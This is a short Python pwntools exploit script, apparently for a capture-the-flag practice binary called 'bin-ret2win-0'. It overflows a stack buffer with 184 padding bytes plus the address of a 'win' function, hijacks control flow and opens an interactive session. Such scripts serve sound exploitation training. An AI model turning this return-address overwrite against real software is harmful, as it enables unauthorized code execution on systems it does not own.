#! /usr/bin/python

from pwn import *

context.update(
        arch="amd64",
        #arch="i386",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["tmux", "split-window", "-h", "-p 65"]
)

def start(binary):
    gs = '''
        init-pwndbg
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote()
    else:
        return process(binary)

def exploit(p,e,r):
    pad = b'A' * 184
    dum = p64(e.sym['_fini'])
    win = p64(e.sym['win'])

    p.sendline(pad + win)
    p.interactive()


if __name__=="__main__":
    file = './bins/bin-ret2win-0'

    p = start(file)
    e = context.binary = ELF(file)
    r = ROP(e)

    exploit(p,e,r)